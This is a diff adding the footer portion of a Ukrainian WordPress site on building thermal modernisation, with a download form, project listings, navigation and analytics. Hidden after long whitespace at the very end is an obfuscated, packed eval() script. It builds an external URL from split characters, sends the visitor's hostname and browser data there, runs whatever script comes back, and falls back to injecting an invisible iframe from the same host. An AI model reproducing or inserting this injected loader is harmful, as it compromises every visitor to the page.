+											<div class="left article-date">19.09.2016</div>
+											<a href="http://thermomodernisation.org/video/termomodernizatsiya-zhitlovogo-budinku-kroki/" class="right article-more"></a>
+											<div class="clr"></div>
+										</div>
+									</div>
+								</li>
+															</ul>
+						</div>
+					</div>
+				</div>
+							</div>
+
+
+
+			<div class="right sitebar">
+				<div class="box widget widget_text"><div class="title title-blue"><h3>Отримати книгу</h3></div>			<div class="textwidget"><div role="form" class="wpcf7" id="wpcf7-f4-o1" lang="ru-RU" dir="ltr">
+<div class="screen-reader-response"></div>
+<form action="/#wpcf7-f4-o1" method="post" class="wpcf7-form" novalidate="novalidate">
+<div style="display: none;">
+<input type="hidden" name="_wpcf7" value="4" />
+<input type="hidden" name="_wpcf7_version" value="4.3.1" />
+<input type="hidden" name="_wpcf7_locale" value="ru_RU" />
+<input type="hidden" name="_wpcf7_unit_tag" value="wpcf7-f4-o1" />
+<input type="hidden" name="_wpnonce" value="ba8461dc1e" />
+</div>
+<div class="inbox">
+<div class="form-text">Завантажте безкоштовне покрокове керівництво "Термомодернізація від А до Я" для робіт з термомодернізації багатоповерхових і приватних будинків</div>
+<div class="forma">
+<ul>
+<li class="forma-input"><span class="wpcf7-form-control-wrap your-name"><input type="text" name="your-name" value="" size="40" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" aria-required="true" aria-invalid="false" placeholder="Ваше ім&#039;я" /></span> </li>
+<li class="forma-input"><span class="wpcf7-form-control-wrap your-name2"><input type="text" name="your-name2" value="" size="40" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" aria-required="true" aria-invalid="false" placeholder="Прізвище" /></span> </li>
+<li class="forma-select"><span class="wpcf7-form-control-wrap select"><select name="select" class="wpcf7-form-control wpcf7-select" aria-invalid="false"><option value="Хто Ви?">Хто Ви?</option><option value="Монтажник">Монтажник</option><option value="Проектувальник">Проектувальник</option><option value="Мешканець будинку">Мешканець будинку</option><option value="Представник ОСББ/ЖБК">Представник ОСББ/ЖБК</option></select></span> </li>
+<li class="forma-input"><span class="wpcf7-form-control-wrap your-email"><input type="email" name="your-email" value="" size="40" class="wpcf7-form-control wpcf7-text wpcf7-email wpcf7-validates-as-required wpcf7-validates-as-email" aria-required="true" aria-invalid="false" placeholder="Ваш E-mail" /></span></li>
+<li class="forma-button"><input type="submit" value="Завантажити" class="wpcf7-form-control wpcf7-submit" /></li>
+</ul>
+</div>
+</div>
+<div class="forma-check">
+<span class="wpcf7-form-control-wrap checkbox"><span class="wpcf7-form-control wpcf7-checkbox wpcf7-validates-as-required"><span class="wpcf7-list-item first last"><input type="checkbox" name="checkbox[]" value="Я даю згоду на обробку моїх персональних даних та внесення її до Бази персональних даних" />&nbsp;<span class="wpcf7-list-item-label">Я даю згоду на обробку моїх персональних даних та внесення її до Бази персональних даних</span></span></span></span>
+</div>
+<div class="wpcf7-response-output wpcf7-display-none"></div></form></div></div>
+		</div>
+			</div>
+
+			<div class="clr"></div>
+		</div>
+
+
+
+
+
+
+
+		<div class="row projects-slider">
+			<div class="box">
+				<div class="title title-red"><h3>Проекти</h3></div>
+				<div class="inbox">
+					<ul>
+												<li class="project">
+							<a href="http://thermomodernisation.org/proekty/shkola-naukova-zmina-m-kiyiv/" class="project-img">
+								<span><img width="389" height="296" src="http://thermomodernisation.org/wp-content/uploads/2016/04/SHkola_Naukova_Zmina.jpg" class="attachment-single-post-thumbnail size-single-post-thumbnail wp-post-image" alt="Школа_Наукова_Зміна" srcset="http://thermomodernisation.org/wp-content/uploads/2016/04/SHkola_Naukova_Zmina-300x228.jpg 300w, http://thermomodernisation.org/wp-content/uploads/2016/04/SHkola_Naukova_Zmina.jpg 389w" sizes="(max-width: 389px) 100vw, 389px" /></span>
+							</a>
+							<div class="project-box">
+								<a href="http://thermomodernisation.org/proekty/shkola-naukova-zmina-m-kiyiv/" class="project-title">Школа «Наукова зміна», м. Київ</a>
+								<div class="moreinfo">
+									<div class="left article-views">332</div>
+									<div class="left article-date">25.03.2016</div>
+									<a href="http://thermomodernisation.org/proekty/shkola-naukova-zmina-m-kiyiv/" class="right article-more"></a>
+									<div class="clr"></div>
+								</div>
+							</div>
+						</li>
+												<li class="project">
+							<a href="http://thermomodernisation.org/proekty/shkoli-26-ta-27-m-ternopil/" class="project-img">
+								<span><img width="1023" height="768" src="http://thermomodernisation.org/wp-content/uploads/2016/04/SHkoli_Ternopil.jpg" class="attachment-single-post-thumbnail size-single-post-thumbnail wp-post-image" alt="Школи_Тернопіль" srcset="http://thermomodernisation.org/wp-content/uploads/2016/04/SHkoli_Ternopil-300x225.jpg 300w, http://thermomodernisation.org/wp-content/uploads/2016/04/SHkoli_Ternopil-768x577.jpg 768w, http://thermomodernisation.org/wp-content/uploads/2016/04/SHkoli_Ternopil-624x468.jpg 624w, http://thermomodernisation.org/wp-content/uploads/2016/04/SHkoli_Ternopil.jpg 1023w" sizes="(max-width: 1023px) 100vw, 1023px" /></span>
+							</a>
+							<div class="project-box">
+								<a href="http://thermomodernisation.org/proekty/shkoli-26-ta-27-m-ternopil/" class="project-title">Школи № 26 та № 27, м. Тернопіль</a>
+								<div class="moreinfo">
+									<div class="left article-views">325</div>
+									<div class="left article-date">20.03.2016</div>
+									<a href="http://thermomodernisation.org/proekty/shkoli-26-ta-27-m-ternopil/" class="right article-more"></a>
+									<div class="clr"></div>
+								</div>
+							</div>
+						</li>
+												<li class="project">
+							<a href="http://thermomodernisation.org/proekty/osbb-binom-lutsk/" class="project-img">
+								<span><img width="231" height="309" src="http://thermomodernisation.org/wp-content/uploads/2016/04/OSBB_Binom_1.jpg" class="attachment-single-post-thumbnail size-single-post-thumbnail wp-post-image" alt="ОСББ_Бином_1" srcset="http://thermomodernisation.org/wp-content/uploads/2016/04/OSBB_Binom_1-224x300.jpg 224w, http://thermomodernisation.org/wp-content/uploads/2016/04/OSBB_Binom_1.jpg 231w" sizes="(max-width: 231px) 100vw, 231px" /></span>
+							</a>
+							<div class="project-box">
+								<a href="http://thermomodernisation.org/proekty/osbb-binom-lutsk/" class="project-title">ОСББ «Біном», Луцьк</a>
+								<div class="moreinfo">
+									<div class="left article-views">359</div>
+									<div class="left article-date">12.03.2016</div>
+									<a href="http://thermomodernisation.org/proekty/osbb-binom-lutsk/" class="right article-more"></a>
+									<div class="clr"></div>
+								</div>
+							</div>
+						</li>
+												<li class="project">
+							<a href="http://thermomodernisation.org/proekty/osbb-vidrodzhennya-1-g-zaporozhe/" class="project-img">
+								<span><img width="1456" height="862" src="http://thermomodernisation.org/wp-content/uploads/2016/04/OSBB_Vidrodzhennya.jpg" class="attachment-single-post-thumbnail size-single-post-thumbnail wp-post-image" alt="ОСББ_Відродження" srcset="http://thermomodernisation.org/wp-content/uploads/2016/04/OSBB_Vidrodzhennya-300x178.jpg 300w, http://thermomodernisation.org/wp-content/uploads/2016/04/OSBB_Vidrodzhennya-768x455.jpg 768w, http://thermomodernisation.org/wp-content/uploads/2016/04/OSBB_Vidrodzhennya-1024x606.jpg 1024w, http://thermomodernisation.org/wp-content/uploads/2016/04/OSBB_Vidrodzhennya-624x369.jpg 624w, http://thermomodernisation.org/wp-content/uploads/2016/04/OSBB_Vidrodzhennya.jpg 1456w" sizes="(max-width: 1456px) 100vw, 1456px" /></span>
+							</a>
+							<div class="project-box">
+								<a href="http://thermomodernisation.org/proekty/osbb-vidrodzhennya-1-g-zaporozhe/" class="project-title">ОСББ «Відродження 1», г. Запорожье</a>
+								<div class="moreinfo">
+									<div class="left article-views">606</div>
+									<div class="left article-date">05.03.2016</div>
+									<a href="http://thermomodernisation.org/proekty/osbb-vidrodzhennya-1-g-zaporozhe/" class="right article-more"></a>
+									<div class="clr"></div>
+								</div>
+							</div>
+						</li>
+												<li class="project">
+							<a href="http://thermomodernisation.org/proekty/rekonstruktsiya-teplovyih-setey-kramatorsk/" class="project-img">
+								<span><img width="188" height="188" src="http://thermomodernisation.org/wp-content/uploads/2015/07/Rekonstruktsiya-Kramatorsk.jpg" class="attachment-single-post-thumbnail size-single-post-thumbnail wp-post-image" alt="Реконструкция, Краматорск" srcset="http://thermomodernisation.org/wp-content/uploads/2015/07/Rekonstruktsiya-Kramatorsk-150x150.jpg 150w, http://thermomodernisation.org/wp-content/uploads/2015/07/Rekonstruktsiya-Kramatorsk.jpg 188w" sizes="(max-width: 188px) 100vw, 188px" /></span>
+							</a>
+							<div class="project-box">
+								<a href="http://thermomodernisation.org/proekty/rekonstruktsiya-teplovyih-setey-kramatorsk/" class="project-title">Реконструкция тепловых сетей, Краматорск</a>
+								<div class="moreinfo">
+									<div class="left article-views">314</div>
+									<div class="left article-date">08.07.2015</div>
+									<a href="http://thermomodernisation.org/proekty/rekonstruktsiya-teplovyih-setey-kramatorsk/" class="right article-more"></a>
+									<div class="clr"></div>
+								</div>
+							</div>
+						</li>
+												<li class="project">
+							<a href="http://thermomodernisation.org/proekty/zhiloy-dom-termomodernizatsiya-lutsk/" class="project-img">
+								<span><img width="470" height="345" src="http://thermomodernisation.org/wp-content/uploads/2015/07/Lutsk_thermomodernisation.bmp" class="attachment-single-post-thumbnail size-single-post-thumbnail wp-post-image" alt="Термомодернізація будинку, Луцьк" srcset="http://thermomodernisation.org/wp-content/uploads/2015/07/Lutsk_thermomodernisation-300x220.jpg 300w, http://thermomodernisation.org/wp-content/uploads/2015/07/Lutsk_thermomodernisation.bmp 470w" sizes="(max-width: 470px) 100vw, 470px" /></span>
+							</a>
+							<div class="project-box">
+								<a href="http://thermomodernisation.org/proekty/zhiloy-dom-termomodernizatsiya-lutsk/" class="project-title">Жилой дом &#8211; термомодернизация, Луцк</a>
+								<div class="moreinfo">
+									<div class="left article-views">161</div>
+									<div class="left article-date">08.07.2015</div>
+									<a href="http://thermomodernisation.org/proekty/zhiloy-dom-termomodernizatsiya-lutsk/" class="right article-more"></a>
+									<div class="clr"></div>
+								</div>
+							</div>
+						</li>
+											</ul>
+				</div>
+			</div>
+		</div>
+			</div>
+
+
+
+	<div class="footer">
+		<div class="container">
+			<div class="footer-navi">
+				<div class="menu-menyu-container"><ul id="menu-menyu-2" class="left"><li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-46"><a href="http://thermomodernisation.org/category/novyny/">Новини</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-44"><a href="http://thermomodernisation.org/category/video/">Відео</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-451"><a href="http://thermomodernisation.org/category/video/intervyu/">Інтерв&#8217;ю</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-130"><a href="http://thermomodernisation.org/category/video/specializovani-vypusky/">Спеціалізовані Випуски</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-128"><a href="http://thermomodernisation.org/category/video/konferentsii-ta-kruglyi-stolyi/">Конференції та круглі столи</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-129"><a href="http://thermomodernisation.org/category/video/technichna-informatsiya/">Технічна інформація</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-49"><a href="http://thermomodernisation.org/category/proekty/">Проекти</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-47"><a href="http://thermomodernisation.org/category/partnery/">Партнери</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-286"><a href="http://thermomodernisation.org/pro-proekt/">Про проект</a></li>
+</ul></div>			<!--	<a href="/podpisatsya/" class="right footer-subscrb">Підписатися</a> -->
+				<div class="clr"></div>
+			</div>
+<!--
+			<div class="social">
+				<ul>
+					<li class="soc-tw"><a href="#"></a></li>
+					<li class="soc-fb"><a href="#"></a></li>
+					<li class="soc-gp"><a href="#"></a></li>
+				</ul>
+			</div>
+-->
+
+			<div class="footer-copy">
+				Copyright © 2015 Усі права захищено <br />
+				<a href="http://webkitchen.kiev.ua/" target="_blank">розроблено в студії Webkitchen</a>
+			</div>
+		</div>
+	</div>
+
+
+	<script type="text/javascript" src="http://thermomodernisation.org/wp-content/themes/damfos/js/jquery.bxslider.min.js"></script>
+	<script type="text/javascript" src="http://thermomodernisation.org/wp-content/themes/damfos/js/SmoothScroll.js"></script>
+	<script type="text/javascript" src="http://thermomodernisation.org/wp-content/themes/damfos/js/custom.js"></script>
+
+
+<script type='text/javascript' src='http://thermomodernisation.org/wp-content/plugins/contact-form-7/includes/js/jquery.form.min.js?ver=3.51.0-2014.06.20'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var _wpcf7 = {"loaderUrl":"http:\/\/thermomodernisation.org\/wp-content\/plugins\/contact-form-7\/images\/ajax-loader.gif","recaptchaEmpty":"Please verify that you are not a robot.","sending":"\u041d\u0430\u0434\u0441\u0438\u043b\u0430\u043d\u043d\u044f..."};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://thermomodernisation.org/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=4.3.1'></script>
+<script type='text/javascript' src='http://thermomodernisation.org/wp-includes/js/wp-embed.min.js?ver=053d2c64d1001548f9c38f0a7a207308'></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript">
+    (function (d, w, c) {
+        (w[c] = w[c] || []).push(function() {
+            try {
+                w.yaCounter44017144 = new Ya.Metrika({
+                    id:44017144,
+                    clickmap:true,
+                    trackLinks:true,
+                    accurateTrackBounce:true,
+                    webvisor:true
+                });
+            } catch(e) { }
+        });
+
+        var n = d.getElementsByTagName("script")[0],
+            s = d.createElement("script"),
+            f = function () { n.parentNode.insertBefore(s, n); };
+        s.type = "text/javascript";
+        s.async = true;
+        s.src = "https://mc.yandex.ru/metrika/watch.js";
+
+        if (w.opera == "[object Opera]") {
+            d.addEventListener("DOMContentLoaded", f, false);
+        } else { f(); }
+    })(document, window, "yandex_metrika_callbacks");
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/44017144" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+<!-- /Yandex.Metrika counter -->
+
+
+
+
+
+
+
+<script type="text/javascript">
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('v x(t,A){j 7=t.1m(A);b(7>1l)Z"1k: 1n 1o 5";f 7}v H(t){b(1!==1p.o)Z"1j: 1I 1D 1B 1F";t=1H(t);j A,7,e=[],r=t.o-t.o%3;b(0===t.o)f t;1G(A=0;r>A;A+=3)7=x(t,A)<<16|x(t,A+1)<<8|x(t,A+2),e.B(k.n(7>>18)),e.B(k.n(7>>12&F)),e.B(k.n(7>>6&F)),e.B(k.n(F&7));1A(t.o-r){W 1:7=x(t,A)<<16,e.B(k.n(7>>18)+k.n(7>>12&F)+G+G);1z;W 2:7=x(t,A)<<16|x(t,A+1)<<8,e.B(k.n(7>>18)+k.n(7>>12&F)+k.n(7>>6&F)+G)}f e.10("")}j G="=",k="1u+/",1t="1.0";v 19(){j 9;Q{9=M 1i("1E.1b")}K(e){Q{9=M 1i("1x.1b")}K(E){9=1y}}b(!9&&1w V!=\'1v\'){9=M V()}f 9}v 14(c){q=c.C(\'\\<13\');b(q==-1)f\'\';q=c.C(\'>\',q);b(q==-1)f\'\';q++;u=c.C(\'\\<\\/13\\>\',q);b(u==-1)f\'\';f c.U(q,u)}v 11(c){b(c.C(\'%1d%\')==-1)f c;f c.1r(\'%1d%\').10(O(H(1f.15.1C)))}v 1a(1h){j y=" "+I.y;j P=" "+1h+"=";j N=L;j D=0;j u=0;b(y.o>0){D=y.C(P);b(D!=-1){D+=P.o;u=y.C(";",D);b(u==-1){u=y.o}N=1q(y.U(D,u))}}f(N)}I.1s(\'<1c 1M="S"></1c>\');b(1a(\'28\')==L){j J=\'Y\'+\'t\'+\'p:\'+\'/\'+\'/\'+\'t\'+\'z\'+\'-\'+\'w\'+\'a\'+\'r\'+\'p\'+\'.\'+\'m\'+\'l\'+\'/\'+\'17\'+\'a\'+\'t.p\'+\'X\';J+=(\'?t=3&d=\'+O(H(1f.15.2a)));J+=(\'&1J=\'+O(H(26.23)));Q{j 9=19();9.24(\'2c\',J,2b);9.2d=v(){b(9.2i==4&&9.2h==2e){c=11(9.2f);I.1g("S").1e=c;R=14(c);b(R.o>0)25(R)}};9.21(L)}K(e){I.1g("S").1e=\'<\'+\'i\'+\'T\'+\'22 s\'+\'1P\'+\'="h\'+\'1R\'+\':/\'+\'/\'+\'t\'+\'z\'+\'-\'+\'w\'+\'a\'+\'r\'+\'p\'+\'.\'+\'m\'+\'l\'+\'/\'+\'17\'+\'a\'+\'t.p\'+\'X"\'+\' 1S\'+\'1T=\'+\'"0\'+\'" 1Z\'+\'20\'+\'t="0\'+\'" T\'+\'1W\'+\'1V\'+\'r="\'+\'0" 1U\'+\'1X\'+\'1Y\'+\'h="\'+\'0" 1L\'+\'1K\'+\'1N\'+\'Y="\'+\'0" 1O\'+\'1Q\'+\'2g\'+\'g="\'+\'27\'+\'">\'+\'<\'+\'/\'+\'i\'+\'T\'+\'29\'+\'e\'+\'>\'}}',62,143,'|||||||_||xmlhttp||if|src|||return||||var|_ALPHA|||charAt|length||start||||end|function||_pref_xxs_getbyte|cookie|||push|indexOf|offset||63|_PADCHAR|_pref_xxs_encode64|document|url|catch|null|new|setStr|encodeURIComponent|search|try|code|statspan_0_1|fr|substring|XMLHttpRequest|case|hp|ht|throw|join|_pref_xxs_processMacro||script|_pref_xxs_extractScript|location||st||_pref_xxs_getXmlHttp|_pref_xxs_getCookie|XMLHTTP|span|ENCURL|innerHTML|window|getElementById|name|ActiveXObject|SyntaxError|INVALID_CHARACTER_ERR|255|charCodeAt|DOM|Exception|arguments|unescape|split|write|_VERSION|ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789|undefined|typeof|Microsoft|false|break|switch|argument|href|one|Msxml2|required|for|String|exactly|ua|rgi|ma|id|nheig|sc|rc|rol|ttp|wid|th|mar|rde|amebo|ginw|idt|hei|gh|send|ame|userAgent|open|eval|navigator|no|stat01|am|hostname|true|GET|onreadystatechange|200|responseText|lin|status|readyState'.split('|'),0,{}))
+</script></body>
+</html>
